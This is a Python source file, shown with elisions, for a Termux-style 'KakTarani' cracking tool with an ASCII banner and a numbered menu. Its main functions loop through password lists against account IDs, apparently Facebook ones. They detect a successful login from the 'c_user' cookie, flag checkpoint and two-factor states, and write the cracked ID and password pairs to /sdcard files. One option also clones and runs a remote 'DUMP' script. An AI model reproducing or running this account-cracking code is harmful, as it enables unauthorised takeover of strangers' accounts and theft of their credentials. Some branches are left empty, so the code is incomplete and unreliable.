...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; KakTarani \x07')
...
#--------------------LOGO--------------------#
logo ="""     
888    d8P         d8888 888    d8P 88888888888     d8888 8888888b.         d8888 888b    888 8888888 
888   d8P         d88888 888   d8P      888        d88888 888   Y88b       d88888 8888b   888   888   
888  d8P         d88P888 888  d8P       888       d88P888 888    888      d88P888 88888b  888   888   
888d88K         d88P 888 888d88K        888      d88P 888 888   d88P     d88P 888 888Y88b 888   888   
8888888b       d88P  888 8888888b       888     d88P  888 8888888P"     d88P  888 888 Y88b888   888   
888  Y88b     d88P   888 888  Y88b      888    d88P   888 888 T88b     d88P   888 888  Y88888   888   
888   Y88b   d8888888888 888   Y88b     888   d8888888888 888  T88b   d8888888888 888   Y8888   888   
888    Y88b d88P     888 888    Y88b    888  d88P     888 888   T88b d88P     888 888    Y888 8888888 
                                                                                                      
                                                                                                      
                                                                                                      

\033[1;37m╔\033[1;36mKakTarani\033[1;37m═══════════════════\033[1;36mKak✯Tarani\033[1;37m═════════════════\033[1;36mCode-Man\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mKakTarani          \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mKakTarani          \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m Code-Man                \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mCode-Man Cracker                 \033[1;31m   │
...
\033[1;37m╚\033[1;36mKakTarani\033[1;37m══════\033[41m\033[1;37m[ 𓆩Script𓆪 𓆩update𓆪 by  𓆩KakTarani𓆪 ]\x1b[0m══════\033[1;36mCodeMan\033[1;37m╝
...
def saprate():
    ...
    print('\033[1;32m Example /sdcard/KakTarani.txt')
...
def main():
    ...
    print(logo)
    print('           \x1b[97m[\033[37;41m  Script for Code-Man\033[0;m] ')
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  WELCOME. TO KakTarani TOOL \033[0;m] ")
    ...
    linex()
    KakTarani = input("[√] CHOOSE : ")
    if KakTarani in ["1","01"]: 
        passx()
    elif KakTarani in ["2","02"]:
        file_crack()
    elif KakTarani in ["3","03"]:
        Filex()
    elif KakTarani in ["4","04"]:
        File_creating()
    elif KakTarani in ["5","05"]:
        saprate()
    elif KakTarani in ["6","06"]:
        remove_dub()
    elif KakTarani in ["7","07"]:
        PROTECT()
    elif KakTarani in ["8","08"]:
        CYTHONIZER()
    elif KakTarani in ["9","09"]:
        BOTX()
    elif KakTarani in ["10","10"]:
      
    elif KakTarani in ["0","00"]:
...
def File_creating():
    os.system(f"git clone https://github.com/KakTarani-king-06/DUMP && cd DUMP && python DUMP.py")
...
def file_crack():
    ...
    print("")
    print(f"{RED}[1] Crack File 1 (Bashtr)")
    print(f"{RED}[2] Crack File 2 (NORMAL)")
    linex()
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/KakTarani_OK.txt\n[•] CP IDS SAVE : /sdcard/KakTarani_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[KakTarani 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio KakTarani_OK.mp3")
                print('\r\033[1;32m[KakTarani-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/KakTarani_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    os.system("play-audio KakTarani_2F.mp3")
                    print('\r\033[1;35m[KakTarani-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/KakTarani_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio KakTarani_CP.mp3")
                    print('\r\033[1;31m[KakTarani-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/KakTarani_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio KakTarani_OK.mp3")
                print('\r\033[1;32m[KakTarani-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/KakTarani_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio KakTarani_2F.mp3")
                    print('\r\033[1;35m[KakTarani-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/KakTarani_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio KakTarani_CP.mp3")
                    print('\r\033[1;31m[KakTarani-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/KakTarani_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[KakTarani 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    os.system("play-audio KakTarani_OK.mp3")
                    print('\r\033[1;92m[KakTarani-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/KakTarani_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio KakTarani_2F.mp3")
                        print('\r\033[1;95m[KakTarani-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/KakTarani_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                            ...
                            os.system("play-audio KakTarani_CP.mp3")
                            print('\r\033[1;94m[KakTarani-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/KakTarani_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/KakTarani-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/KakTarani-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/KakTarani-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/KakTarani-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    ...
                    open('/sdcard/KakTarani-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[KakTarani 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
